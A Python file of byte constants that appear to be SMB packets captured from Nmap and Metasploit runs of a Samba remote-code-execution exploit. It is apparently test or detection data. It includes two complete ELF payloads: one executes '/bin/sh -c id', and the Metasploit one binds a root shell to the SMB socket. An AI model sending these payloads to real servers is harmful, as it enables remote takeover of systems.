# NMap
INIT_NPR = b'\0\0\0\x31\xff\x53\x4d\x42\x72\0\0\0\0\x18\x45\x60\0\0\0\0\0\0\0\0\0\0\0\0\0\0\x33\x6d\0\0\x01\0\0' \
           b'\x0e\0\x02\x4e\x54\x20\x4c\x4d\x20\x30\x2e\x31\x32\0\x02\0'

ES_SAXR1 = b'\0\0\0\x91\xff\x53\x4d\x42\x73\0\0\0\0\x18\x45\x68\0\0\x36\xed\x87\xed\x6d\x17\x3d\xbb\0\0\0\0\x02' \
           b'\x05\0\0\x01\0\x0c\xff\0\x91\0\xff\xff\x01\0\x01\0\x31\0\0\0\x42\0\0\0\0\0\x50\0\0\x80\x56\0\x60\x40' \
           b'\x06\x06\x2b\x06\x01\x05\x05\x02\xa0\x36\x30\x34\xa0\x0e\x30\x0c\x06\x0a\x2b\x06\x01\x04\x01\x82\x37' \
           b'\x02\x02\x0a\xa2\x22\x04\x20\x4e\x54\x4c\x4d\x53\x53\x50\0\x01\0\0\0\x15\x82\x08\0\0\0\0\0\0\0\0\0\0' \
           b'\0\0\0\0\0\0\0\x4e\x6d\x61\x70\0\x4e\x61\x74\x69\x76\x65\x20\x4c\x61\x6e\x6d\x61\x6e\0\0'

ES_SAXR2 = b'\0\0\0\xb0\xff\x53\x4d\x42\x73\0\0\0\0\x18\x45\x68\0\0\xe0\x89\xbe\x93\x42\xba\x5d\xdf\0\0\0\0\x02\x05' \
           b'\xab\x0b\x01\0\x0c\xff\0\xb0\0\xff\xff\x01\0\x01\0\x31\0\0\0\x61\0\0\0\0\0\x50\0\0\x80\x75\0\xa1\x5f' \
           b'\x30\x5d\xa2\x5b\x04\x59\x4e\x54\x4c\x4d\x53\x53\x50\0\x03\0\0\0\x01\0\x01\0\x48\0\0\0\0\0\0\0\x49\0\0' \
           b'\0\0\0\0\0\x40\0\0\0\0\0\0\0\x40\0\0\0\x08\0\x08\0\x40\0\0\0\x10\0\x10\0\x49\0\0\0\x15\x82\x08\0\x6e\0' \
           b'\x6d\0\x61\0\x70\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\x4e\x6d\x61\x70\0\x4e\x61\x74\x69\x76\x65\x20\x4c' \
           b'\x61\x6e\x6d\x61\x6e\0\0'

BIND = b'\0\0\0\x87\xff\x53\x4d\x42\x2f\0\0\0\0\x18\x45\x68\0\0\xb2\x3a\xfc\xab\xd6\x10\x5d\xdd\0\0\x6f\x21\xcb\x72' \
       b'\xe4\x93\x01\0\x0e\xff\0\0\0\xa1\xf6\0\0\0\0\xff\xff\xff\xff\x08\0\x48\0\0\0\x48\0\x3f\0\0\0\0\0\x48\0\x05' \
       b'\0\x0b\x03\x10\0\0\0\x48\0\0\0\x41\x41\x41\x41\0\x08\0\x08\0\0\0\0\x01\0\0\0\0\0\x01\0\xc8\x4f\x32\x4b\x70' \
       b'\x16\xd3\x01\x12\x78\x5a\x47\xbf\x6e\xe1\x88\x03\0\0\0\x04\x5d\x88\x8a\xeb\x1c\xc9\x11\x9f\xe8\x08\0\x2b' \
       b'\x10\x48\x60\x02\0\0\0'

NETSHARE_ENUM_ALL = b'\0\0\0\xa7\xff\x53\x4d\x42\x2f\0\0\0\0\x18\x45\x68\0\0\xa0\x85\xa8\x35\xe2\x57\x7c\x0e\0\0\xf3' \
                    b'\x12\x29\x46\x3c\xc4\x01\0\x0e\xff\0\0\0\x2f\x45\0\0\0\0\xff\xff\xff\xff\x08\0\x68\0\0\0\x68\0' \
                    b'\x3f\0\0\0\0\0\x68\0\x05\0\0\x03\x10\0\0\0\x68\0\0\0\x41\x41\x41\x41\x50\0\0\0\0\0\x0f\0\x4e' \
                    b'\x4d\x41\x50\x0f\0\0\0\0\0\0\0\x0f\0\0\0\x5c\0\x5c\0\x31\0\x39\0\x32\0\x2e\0\x31\0\x36\0\x38\0' \
                    b'\x2e\0\x31\0\x2e\0\x31\0\x31\0\0\0\0\0\0\0\0\0\0\0\0\0\x4e\x4d\x41\x50\0\0\0\0\0\0\0\0\0\x10\0' \
                    b'\0\x4e\x4d\x41\x50\0\0\0\0'

READ_ANDX_REQUEST = b'\0\0\0\x3b\xff\x53\x4d\x42\x2e\0\0\0\0\x18\x45\x68\0\0\x77\x1b\xf2\x94\xfa\x62\xe3\x55\0\0\xf3' \
                    b'\x12\x29\x46\x3c\xc4\x01\0\x0c\xff\0\0\0\x2f\x45\0\0\0\0\0\x08\0\x08\xff\xff\xff\xff\0\0\0\0\0' \
                    b'\0\0\0'

GET_INFO_IPC = b'\0\0\0\xa3\xff\x53\x4d\x42\x2f\0\0\0\0\x18\x45\x68\0\0\xf3\xb5\x68\x69\xcc\xc5\xf0\x12\0\0\x6f\x21' \
               b'\xcb\x72\xe4\x93\x01\0\x0e\xff\0\0\0\xa1\xf6\0\0\0\0\xff\xff\xff\xff\x08\0\x64\0\0\0\x64\0\x3f\0\0' \
               b'\0\0\0\x64\0\x05\0\0\x03\x10\0\0\0\x64\0\0\0\x41\x41\x41\x41\x4c\0\0\0\0\0\x10\0\x4e\x4d\x41\x50' \
               b'\x0f\0\0\0\0\0\0\0\x0f\0\0\0\x5c\0\x5c\0\x31\0\x39\0\x32\0\x2e\0\x31\0\x36\0\x38\0\x2e\0\x31\0\x2e' \
               b'\0\x31\0\x31\0\0\0\0\0\x05\0\0\0\0\0\0\0\x05\0\0\0\x49\0\x50\0\x43\0\x24\0\0\0\0\0\x02\0\0\0'

NMAP_GET_INFO_DATA = b'\0\0\0\xa3\xff\x53\x4d\x42\x2f\0\0\0\0\x18\x45\x68\0\0\xde\x2d\x5c\x78\x59\x1e\x99\x2e\0\0\x58' \
                     b'\x6c\xc1\x77\x52\x6c\x01\0\x0e\xff\0\0\0\xc0\xa6\0\0\0\0\xff\xff\xff\xff\x08\0\x64\0\0\0\x64\0' \
                     b'\x3f\0\0\0\0\0\x64\0\x05\0\0\x03\x10\0\0\0\x64\0\0\0\x41\x41\x41\x41\x4c\0\0\0\0\0\x10\0\x4e' \
                     b'\x4d\x41\x50\x0f\0\0\0\0\0\0\0\x0f\0\0\0\x5c\0\x5c\0\x31\0\x39\0\x32\0\x2e\0\x31\0\x36\0\x38\0' \
                     b'\x2e\0\x31\0\x2e\0\x31\0\x31\0\0\0\0\0\x05\0\0\0\0\0\0\0\x05\0\0\0\x64\0\x61\0\x74\0\x61\0\0\0' \
                     b'\0\0\x02\0\0\0'

NMAP_EXPLOIT = b'\x7f\x45\x4c\x46\x02\x01\x01\0\0\0\0\0\0\0\0\0\x03\0\x3e\0\x01\0\0\0\x92\x01\0\0\0\0\0\0\x40\0\0\0\0' \
               b'\0\0\0\xb0\0\0\0\0\0\0\0\0\0\0\0\x40\0\x38\0\x02\0\x40\0\x02\0\x01\0\x01\0\0\0\x07\0\0\0\0\0\0\0\0\0' \
               b'\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\xbc\x01\0\0\0\0\0\0\xe6\x01\0\0\0\0\0\0\0\x10\0\0\0\0\0\0\x02\0' \
               b'\0\0\x07\0\0\0\x30\x01\0\0\0\0\0\0\x30\x01\0\0\0\0\0\0\x30\x01\0\0\0\0\0\0\x60\0\0\0\0\0\0\0\x60\0\0' \
               b'\0\0\0\0\0\0\x10\0\0\0\0\0\0\x01\0\0\0\x06\0\0\0\0\0\0\0\0\0\0\0\x30\x01\0\0\0\0\0\0\x30\x01\0\0\0\0' \
               b'\0\0\x60\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\x08\0\0\0\0\0\0\0\x07\0\0\0\0\0\0\0\0\0\0\0\x03\0\0\0\0\0\0\0' \
               b'\0\0\0\0\x90\x01\0\0\0\0\0\0\x90\x01\0\0\0\0\0\0\x02\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0' \
               b'\0\0\0\0\0\0\0\x0c\0\0\0\0\0\0\0\x92\x01\0\0\0\0\0\0\x05\0\0\0\0\0\0\0\x90\x01\0\0\0\0\0\0\x06\0\0\0' \
               b'\0\0\0\0\x90\x01\0\0\0\0\0\0\x0a\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\x0b\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0' \
               b'\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\x6a\x3b\x58\x99\x48\xbb\x2f\x62\x69\x6e\x2f\x73\x68\0\x53\x48\x89' \
               b'\xe7\x68\x2d\x63\0\0\x48\x89\xe6\x52\xe8\x03\0\0\0\x69\x64\0\x56\x57\x48\x89\xe6\x0f\x05'

# Metasploit

MSF_INIT_NPR = b'\0\0\0\x54\xff\x53\x4d\x42\x72\0\0\0\0\x18\x01\x28\0\0\0\0\0\0\0\0\0\0\0\0\0\0\x0c\x34\0\0\xd2\x5a\0' \
             b'\x31\0\x02\x4c\x41\x4e\x4d\x41\x4e\x31\x2e\x30\0\x02\x4c\x4d\x31\x2e\x32\x58\x30\x30\x32\0\x02\x4e' \
             b'\x54\x20\x4c\x41\x4e\x4d\x41\x4e\x20\x31\x2e\x30\0\x02\x4e\x54\x20\x4c\x4d\x20\x30\x2e\x31\x32\0'

MSF_SAXR = b'\0\0\x01\x6e\xff\x53\x4d\x42\x73\0\0\0\0\x18\x01\x28\0\0\0\0\0\0\0\0\0\0\0\0\0\0\xbe\x11\x87\xef\xd8\xcb' \
         b'\x0c\xff\0\0\0\xdf\xff\x02\0\x01\0\x1a\0\0\0\x10\x01\0\0\0\0\x5c\xd0\0\x80\x33\x01\x4e\x54\x4c\x4d\x53\x53' \
         b'\x50\0\x03\0\0\0\x18\0\x18\0\x40\0\0\0\x96\0\x96\0\x58\0\0\0\x02\0\x02\0\xee\0\0\0\0\0\0\0\xf0\0\0\0\x20\0' \
         b'\x20\0\xf0\0\0\0\0\0\0\0\x10\x01\0\0\x05\x02\x88\xa2\x3a\x2a\x3f\x54\xbc\xc7\xa4\x91\xc2\x9f\xf9\x4d\0\x7d' \
         b'\x79\xad\x5e\x93\x81\xb4\xc7\xf9\x85\xbb\x10\x0b\xd2\x8f\xcf\x80\x0c\xb1\x93\xcf\x32\x0e\xe3\x82\x9d\xb8' \
         b'\x01\x01\0\0\0\0\0\0\x80\x19\xa3\x0a\x30\x16\xd5\x01\x5e\x93\x81\xb4\xc7\xf9\x85\xbb\0\0\0\0\x02\0\x16\0' \
         b'\x48\0\x41\0\x43\0\x4b\0\x45\0\x44\0\x53\0\x41\0\x4d\0\x42\0\x41\0\x01\0\x16\0\x48\0\x41\0\x43\0\x4b\0\x45' \
         b'\0\x44\0\x53\0\x41\0\x4d\0\x42\0\x41\0\x04\0\x02\0\0\0\x03\0\x18\0\x37\0\x64\0\x62\0\x65\0\x31\0\x32\0\x37' \
         b'\0\x64\0\x30\0\x36\0\x35\0\x36\0\x07\0\x08\0\xf8\xf4\xc7\x0a\x30\x16\xd5\x01\0\0\0\0\0\0\0\0\x2e\0\x44\0' \
         b'\x31\0\x74\0\x6d\0\x57\0\x71\0\x6d\0\x72\0\x72\0\x55\0\x75\0\x72\0\x78\0\x36\0\x4c\0\x30\0\x57\x69\x6e\x64' \
         b'\x6f\x77\x73\x20\x32\x30\x30\x30\x20\x32\x31\x39\x35\0\x57\x69\x6e\x64\x6f\x77\x73\x20\x32\x30\x30\x30\x20' \
         b'\x35\x2e\x30\0'

MSF_BIND = b'\0\0\0\x87\xff\x53\x4d\x42\x2f\0\0\0\0\x18\x01\x28\0\0\0\0\0\0\0\0\0\0\0\0\xe2\x76\x8c\xd9\0\0' \
                  b'\x3b\x96\x0e\xff\0\0\0\xe8\x9c\x8e\x01\0\0\xff\xff\xff\xff\x08\0\x48\0\0\0\x48\0\x3f\0\0\0\0\0' \
                  b'\x48\0\x05\0\x0b\x03\x10\0\0\0\x48\0\0\0\0\0\0\0\xd0\x16\xd0\x16\0\0\0\0\x01\0\0\0\0\0\x01\0\xc8' \
                  b'\x4f\x32\x4b\x70\x16\xd3\x01\x12\x78\x5a\x47\xbf\x6e\xe1\x88\x03\0\0\0\x04\x5d\x88\x8a\xeb\x1c' \
                  b'\xc9\x11\x9f\xe8\x08\0\x2b\x10\x48\x60\x02\0\0\0'

MSF_READ_ANDX_REQUEST = b'\0\0\0\x3b\xff\x53\x4d\x42\x2e\0\0\0\0\x18\x01\x28\0\0\0\0\0\0\0\0\0\0\0\0\x92\xf2' \
                               b'\x2d\xbe\0\0\xdf\x7d\x0a\xff\0\0\0\xb9\xc2\0\0\0\0\xff\xff\xff\xff\xff\xff\xff\xff\0' \
                               b'\0\0\0\0\0\0\0'

MSF_TRANS2_REQUEST = b'\0\0\0\x50\xff\x53\x4d\x42\x32\0\0\0\0\x18\x01\x28\0\0\0\0\0\0\0\0\0\0\0\0\xa9\xe8\x5a\xca\x31' \
                     b'\xeb\xcf\x59\x0f\x0f\0\0\0\0\x04\xe8\xfd\0\0\0\0\0\0\0\0\0\0\x0f\0\x41\0\0\0\x50\0\x01\0\x01\0' \
                     b'\x0f\0\x1a\0\x14\0\x06\0\x04\x01\0\0\0\0\x5c\x2a\0'  # [36:] should be identical to this

MSF_OPEN_ANDX_REQUEST = b'\0\0\0\x4c\xff\x53\x4d\x42\x2d\0\0\0\0\x18\x01\x28\0\0\0\0\0\0\0\0\0\0\0\0\xe2\x68\xbe\x11' \
                        b'\xdf\x2c\xd8\xcb\x0f\xff\0\0\0\0\0\x42\0\x06\0\0\0\0\0\0\0\x12\0\0\0\0\0\0\0\0\0\0\0\0\0' \
                        b'\x0b\0\x5c\x75\x45\x67\x76\x41\x2e\x74\x78\x74\0'  # [36:67] should be identical to this

MSF_GET_INFO_DATA = b'\0\0\0\x9f\xff\x53\x4d\x42\x2f\0\0\0\0\x18\x01\x28\0\0\0\0\0\0\0\0\0\0\0\0\xb6\xd6\xe6\x44\xc9' \
                    b'\x65\xdd\x9b\x0e\xff\0\0\0\x8c\xd3\x14\x03\0\0\xff\xff\xff\xff\x08\0\x60\0\0\0\x60\0\x3f\0\0\0' \
                    b'\0\0\x60\0\x05\0\0\x03\x10\0\0\0\x60\0\0\0\0\0\0\0\x48\0\0\0\0\0\x10\0\x99\xfd\xdc\x42\x0e\0\0' \
                    b'\0\0\0\0\0\x0e\0\0\0\x5c\0\x5c\0\x31\0\x39\0\x32\0\x2e\0\x31\0\x36\0\x38\0\x2e\0\x30\0\x2e\0' \
                    b'\x31\0\0\0\x05\0\0\0\0\0\0\0\x05\0\0\0\x64\0\x61\0\x74\0\x61\0\0\0\0\0\x02\0\0\0'

MSF_EXPLOIT = b'\x7f\x45\x4c\x46\x02\x01\x01\0\0\0\0\0\0\0\0\0\x03\0\x3e\0\x01\0\0\0\x30\x07\0\0\0\0\0\0\x40\0\0\0\0' \
              b'\0\0\0\x90\x19\0\0\0\0\0\0\0\0\0\0\x40\0\x38\0\x07\0\x40\0\x1d\0\x1a\0\x01\0\0\0\x05\0\0\0\0\0\0\0\0' \
              b'\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\x64\x0a\0\0\0\0\0\0\x64\x0a\0\0\0\0\0\0\0\0\x20\0\0\0\0\0\x01' \
              b'\0\0\0\x06\0\0\0\0\x0e\0\0\0\0\0\0\0\x0e\x20\0\0\0\0\0\0\x0e\x20\0\0\0\0\0\x50\x02\0\0\0\0\0\0\x58' \
              b'\x02\0\0\0\0\0\0\0\0\x20\0\0\0\0\0\x02\0\0\0\x06\0\0\0\x18\x0e\0\0\0\0\0\0\x18\x0e\x20\0\0\0\0\0\x18' \
              b'\x0e\x20\0\0\0\0\0\xc0\x01\0\0\0\0\0\0\xc0\x01\0\0\0\0\0\0\x08\0\0\0\0\0\0\0\x04\0\0\0\x04\0\0\0\xc8' \
              b'\x01\0\0\0\0\0\0\xc8\x01\0\0\0\0\0\0\xc8\x01\0\0\0\0\0\0\x24\0\0\0\0\0\0\0\x24\0\0\0\0\0\0\0\x04\0\0' \
              b'\0\0\0\0\0\x50\xe5\x74\x64\x04\0\0\0\xbc\x09\0\0\0\0\0\0\xbc\x09\0\0\0\0\0\0\xbc\x09\0\0\0\0\0\0\x24' \
              b'\0\0\0\0\0\0\0\x24\0\0\0\0\0\0\0\x04\0\0\0\0\0\0\0\x51\xe5\x74\x64\x06\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0' \
              b'\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\x10\0\0\0\0\0\0\0\x52\xe5\x74\x64\x04\0\0\0' \
              b'\0\x0e\0\0\0\0\0\0\0\x0e\x20\0\0\0\0\0\0\x0e\x20\0\0\0\0\0\0\x02\0\0\0\0\0\0\0\x02\0\0\0\0\0\0\x01\0' \
              b'\0\0\0\0\0\0\x04\0\0\0\x14\0\0\0\x03\0\0\0\x47\x4e\x55\0\xff\xd0\xa4\xc4\x27\x48\xf4\x59\x7a\x92\xff' \
              b'\x68\x0f\xee\x6c\xa6\xeb\xf2\x68\xdc\0\0\0\0\x03\0\0\0\x0c\0\0\0\x01\0\0\0\x06\0\0\0\x8a\xc0\x60\x01' \
              b'\x02\x04\x60\x09\x0c\0\0\0\x0f\0\0\0\x12\0\0\0\x42\x45\xd5\xec\xba\xe3\x92\x7c\xa1\xa5\xd2\x28\x40' \
              b'\x1d\x31\x5c\xd8\x71\x58\x1c\xb9\x8d\xf1\x0e\xeb\xd3\xef\x0e\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0' \
              b'\0\0\0\0\0\0\0\0\x03\0\x09\0\x88\x06\0\0\0\0\0\0\0\0\0\0\0\0\0\0\x1c\0\0\0\x20\0\0\0\0\0\0\0\0\0\0\0' \
              b'\0\0\0\0\0\0\0\0\x7c\0\0\0\x12\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\xb3\0\0\0\x12\0\0\0\0\0\0\0\0\0' \
              b'\0\0\0\0\0\0\0\0\0\0\x75\0\0\0\x12\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\x01\0\0\0\x20\0\0\0\0\0\0\0' \
              b'\0\0\0\0\0\0\0\0\0\0\0\0\x9f\0\0\0\x10\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\x61\0\0\0\x20\0\0\0\0\0' \
              b'\0\0\0\0\0\0\0\0\0\0\0\0\0\0\x81\0\0\0\x12\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\x38\0\0\0\x20\0\0\0' \
              b'\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\x52\0\0\0\x22\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\xd4\0\0\0\x10\0' \
              b'\x17\0\x50\x10\x20\0\0\0\0\0\0\0\0\0\0\0\0\0\xe7\0\0\0\x10\0\x18\0\x58\x10\x20\0\0\0\0\0\0\0\0\0\0\0' \
              b'\0\0\xb8\0\0\0\x12\0\x0c\0\x9a\x09\0\0\0\0\0\0\x0b\0\0\0\0\0\0\0\x8d\0\0\0\x12\0\x0c\0\x30\x08\0\0\0' \
              b'\0\0\0\x6a\x01\0\0\0\0\0\0\xdb\0\0\0\x10\0\x18\0\x50\x10\x20\0\0\0\0\0\0\0\0\0\0\0\0\0\x10\0\0\0\x12' \
              b'\0\x09\0\x88\x06\0\0\0\0\0\0\0\0\0\0\0\0\0\0\x16\0\0\0\x12\0\x0d\0\xa8\x09\0\0\0\0\0\0\0\0\0\0\0\0\0' \
              b'\0\0\x5f\x5f\x67\x6d\x6f\x6e\x5f\x73\x74\x61\x72\x74\x5f\x5f\0\x5f\x69\x6e\x69\x74\0\x5f\x66\x69\x6e' \
              b'\x69\0\x5f\x49\x54\x4d\x5f\x64\x65\x72\x65\x67\x69\x73\x74\x65\x72\x54\x4d\x43\x6c\x6f\x6e\x65\x54' \
              b'\x61\x62\x6c\x65\0\x5f\x49\x54\x4d\x5f\x72\x65\x67\x69\x73\x74\x65\x72\x54\x4d\x43\x6c\x6f\x6e\x65' \
              b'\x54\x61\x62\x6c\x65\0\x5f\x5f\x63\x78\x61\x5f\x66\x69\x6e\x61\x6c\x69\x7a\x65\0\x5f\x4a\x76\x5f\x52' \
              b'\x65\x67\x69\x73\x74\x65\x72\x43\x6c\x61\x73\x73\x65\x73\0\x65\x78\x65\x63\x76\x65\0\x64\x75\x70\x32' \
              b'\0\x67\x65\x74\x73\x6f\x63\x6b\x6e\x61\x6d\x65\0\x73\x61\x6d\x62\x61\x5f\x69\x6e\x69\x74\x5f\x6d\x6f' \
              b'\x64\x75\x6c\x65\0\x63\x68\x61\x6e\x67\x65\x5f\x74\x6f\x5f\x72\x6f\x6f\x74\x5f\x75\x73\x65\x72\0\x73' \
              b'\x65\x6e\x64\0\x69\x6e\x69\x74\x5f\x73\x61\x6d\x62\x61\x5f\x6d\x6f\x64\x75\x6c\x65\0\x6c\x69\x62\x63' \
              b'\x2e\x73\x6f\x2e\x36\0\x5f\x65\x64\x61\x74\x61\0\x5f\x5f\x62\x73\x73\x5f\x73\x74\x61\x72\x74\0\x5f' \
              b'\x65\x6e\x64\0\x47\x4c\x49\x42\x43\x5f\x32\x2e\x32\x2e\x35\0\0\0\0\0\0\0\x02\0\x02\0\x02\0\0\0\0\0\0' \
              b'\0\x02\0\0\0\x02\0\x01\0\x01\0\x01\0\x01\0\x01\0\x01\0\x01\0\0\0\x01\0\x01\0\xca\0\0\0\x10\0\0\0\0\0' \
              b'\0\0\x75\x1a\x69\x09\0\0\x02\0\xec\0\0\0\0\0\0\0\0\x0e\x20\0\0\0\0\0\x08\0\0\0\0\0\0\0\0\x08\0\0\0\0' \
              b'\0\0\x08\x0e\x20\0\0\0\0\0\x08\0\0\0\0\0\0\0\xc0\x07\0\0\0\0\0\0\x48\x10\x20\0\0\0\0\0\x08\0\0\0\0\0' \
              b'\0\0\x48\x10\x20\0\0\0\0\0\xd8\x0f\x20\0\0\0\0\0\x06\0\0\0\x02\0\0\0\0\0\0\0\0\0\0\0\xe0\x0f\x20\0\0' \
              b'\0\0\0\x06\0\0\0\x06\0\0\0\0\0\0\0\0\0\0\0\xe8\x0f\x20\0\0\0\0\0\x06\0\0\0\x08\0\0\0\0\0\0\0\0\0\0\0' \
              b'\xf0\x0f\x20\0\0\0\0\0\x06\0\0\0\x0a\0\0\0\0\0\0\0\0\0\0\0\xf8\x0f\x20\0\0\0\0\0\x06\0\0\0\x0b\0\0\0' \
              b'\0\0\0\0\0\0\0\0\x18\x10\x20\0\0\0\0\0\x07\0\0\0\x03\0\0\0\0\0\0\0\0\0\0\0\x20\x10\x20\0\0\0\0\0\x07' \
              b'\0\0\0\x04\0\0\0\0\0\0\0\0\0\0\0\x28\x10\x20\0\0\0\0\0\x07\0\0\0\x05\0\0\0\0\0\0\0\0\0\0\0\x30\x10' \
              b'\x20\0\0\0\0\0\x07\0\0\0\x0f\0\0\0\0\0\0\0\0\0\0\0\x38\x10\x20\0\0\0\0\0\x07\0\0\0\x07\0\0\0\0\0\0\0' \
              b'\0\0\0\0\x40\x10\x20\0\0\0\0\0\x07\0\0\0\x09\0\0\0\0\0\0\0\0\0\0\0\x48\x83\xec\x08\x48\x8b\x05\x4d' \
              b'\x09\x20\0\x48\x85\xc0\x74\x05\xe8\x83\0\0\0\x48\x83\xc4\x08\xc3\0\0\0\0\0\0\0\0\0\0\0\0\0\0\xff\x35' \
              b'\x52\x09\x20\0\xff\x25\x54\x09\x20\0\x0f\x1f\x40\0\xff\x25\x52\x09\x20\0\x68\0\0\0\0\xe9\xe0\xff\xff' \
              b'\xff\xff\x25\x4a\x09\x20\0\x68\x01\0\0\0\xe9\xd0\xff\xff\xff\xff\x25\x42\x09\x20\0\x68\x02\0\0\0\xe9' \
              b'\xc0\xff\xff\xff\xff\x25\x3a\x09\x20\0\x68\x03\0\0\0\xe9\xb0\xff\xff\xff\xff\x25\x32\x09\x20\0\x68' \
              b'\x04\0\0\0\xe9\xa0\xff\xff\xff\xff\x25\x2a\x09\x20\0\x68\x05\0\0\0\xe9\x90\xff\xff\xff\xff\x25\xba' \
              b'\x08\x20\0\x66\x90\xff\x25\xca\x08\x20\0\x66\x90\x48\x8d\x3d\x19\x09\x20\0\x48\x8d\x05\x19\x09\x20\0' \
              b'\x55\x48\x29\xf8\x48\x89\xe5\x48\x83\xf8\x0e\x76\x15\x48\x8b\x05\x86\x08\x20\0\x48\x85\xc0\x74\x09' \
              b'\x5d\xff\xe0\x66\x0f\x1f\x44\0\0\x5d\xc3\x0f\x1f\x40\0\x66\x2e\x0f\x1f\x84\0\0\0\0\0\x48\x8d\x3d\xd9' \
              b'\x08\x20\0\x48\x8d\x35\xd2\x08\x20\0\x55\x48\x29\xfe\x48\x89\xe5\x48\xc1\xfe\x03\x48\x89\xf0\x48\xc1' \
              b'\xe8\x3f\x48\x01\xc6\x48\xd1\xfe\x74\x18\x48\x8b\x05\x51\x08\x20\0\x48\x85\xc0\x74\x0c\x5d\xff\xe0' \
              b'\x66\x0f\x1f\x84\0\0\0\0\0\x5d\xc3\x0f\x1f\x40\0\x66\x2e\x0f\x1f\x84\0\0\0\0\0\x80\x3d\x89\x08\x20\0' \
              b'\0\x75\x27\x48\x83\x3d\x27\x08\x20\0\0\x55\x48\x89\xe5\x74\x0c\x48\x8b\x3d\x6a\x08\x20\0\xe8\x45\xff' \
              b'\xff\xff\xe8\x48\xff\xff\xff\x5d\xc6\x05\x60\x08\x20\0\x01\xf3\xc3\x0f\x1f\x40\0\x66\x2e\x0f\x1f\x84' \
              b'\0\0\0\0\0\x48\x8d\x3d\x09\x06\x20\0\x48\x83\x3f\0\x75\x0b\xe9\x5e\xff\xff\xff\x66\x0f\x1f\x44\0\0' \
              b'\x48\x8b\x05\xc9\x07\x20\0\x48\x85\xc0\x74\xe9\x55\x48\x89\xe5\xff\xd0\x5d\xe9\x40\xff\xff\xff\x55' \
              b'\x48\x89\xe5\x48\x83\xec\x60\x48\x8d\x05\x72\x01\0\0\x48\x89\x45\xe0\x48\xc7\x45\xe8\0\0\0\0\xc7\x45' \
              b'\xcc\x10\0\0\0\xc6\x45\xa0\0\xc6\x45\xa1\0\xc6\x45\xa2\0\xc6\x45\xa3\x23\xc6\x45\xa4\xff\xc6\x45\xa5' \
              b'\x53\xc6\x45\xa6\x4d\xc6\x45\xa7\x42\xc6\x45\xa8\xa2\xc6\x45\xa9\x39\xc6\x45\xaa\0\xc6\x45\xab\0\xc6' \
              b'\x45\xac\xc0\xc6\x45\xad\x88\xc6\x45\xae\x03\xc6\x45\xaf\xc8\xc6\x45\xb0\0\xc6\x45\xb1\0\xc6\x45\xb2' \
              b'\0\xc6\x45\xb3\0\xc6\x45\xb4\0\xc6\x45\xb5\0\xc6\x45\xb6\0\xc6\x45\xb7\0\xc6\x45\xb8\0\xc6\x45\xb9\0' \
              b'\xc6\x45\xba\0\xc6\x45\xbb\0\xc6\x45\xbc\x01\xc6\x45\xbd\0\xc6\x45\xbe\x64\xc6\x45\xbf\x7e\xc6\x45' \
              b'\xc0\x64\xc6\x45\xc1\0\xc6\x45\xc2\x8c\xc6\x45\xc3\0\xc6\x45\xc4\0\xc6\x45\xc5\0\xc6\x45\xc6\0\xe8' \
              b'\x0d\xfe\xff\xff\xc7\x45\xfc\0\x10\0\0\xe9\x8a\0\0\0\x48\x8d\x55\xcc\x48\x8d\x4d\xd0\x8b\x45\xfc\x48' \
              b'\x89\xce\x89\xc7\xe8\xfc\xfd\xff\xff\x85\xc0\x75\x69\x0f\xb7\x45\xd0\x66\x83\xf8\x02\x75\x62\x48\x8d' \
              b'\x75\xa0\x8b\x45\xfc\xb9\0\0\0\0\xba\x27\0\0\0\x89\xc7\xe8\x96\xfd\xff\xff\x8b\x45\xfc\xbe\0\0\0\0' \
              b'\x89\xc7\xe8\x77\xfd\xff\xff\x8b\x45\xfc\xbe\x01\0\0\0\x89\xc7\xe8\x68\xfd\xff\xff\x8b\x45\xfc\xbe' \
              b'\x02\0\0\0\x89\xc7\xe8\x59\xfd\xff\xff\x48\x8b\x45\xe0\x48\x8d\x4d\xe0\xba\0\0\0\0\x48\x89\xce\x48' \
              b'\x89\xc7\xe8\x61\xfd\xff\xff\xeb\x04\x90\xeb\x01\x90\x83\x6d\xfc\x01\x83\x7d\xfc\0\x0f\x8f\x6c\xff' \
              b'\xff\xff\xb8\0\0\0\0\xc9\xc3\x55\x48\x89\xe5\xe8\x4d\xfd\xff\xff\x5d\xc3\0\0\0\x48\x83\xec\x08\x48' \
              b'\x83\xc4\x08\xc3\x2f\x62\x69\x6e\x2f\x73\x68\0\0\0\0\x01\x1b\x03\x3b\x20\0\0\0\x03\0\0\0\xf4\xfc\xff' \
              b'\xff\x3c\0\0\0\x74\xfe\xff\xff\x64\0\0\0\xde\xff\xff\xff\x84\0\0\0\x14\0\0\0\0\0\0\0\x01\x7a\x52\0' \
              b'\x01\x78\x10\x01\x1b\x0c\x07\x08\x90\x01\0\0\x24\0\0\0\x1c\0\0\0\xb0\xfc\xff\xff\x70\0\0\0\0\x0e\x10' \
              b'\x46\x0e\x18\x4a\x0f\x0b\x77\x08\x80\0\x3f\x1a\x3b\x2a\x33\x24\x22\0\0\0\0\x1c\0\0\0\x44\0\0\0\x08' \
              b'\xfe\xff\xff\x6a\x01\0\0\0\x41\x0e\x10\x86\x02\x43\x0d\x06\x03\x65\x01\x0c\x07\x08\0\x1c\0\0\0\x64\0' \
              b'\0\0\x52\xff\xff\xff\x0b\0\0\0\0\x41\x0e\x10\x86\x02\x43\x0d\x06\x46\x0c\x07\x08\0\0\0\0\0\0\0\0\0\0' \
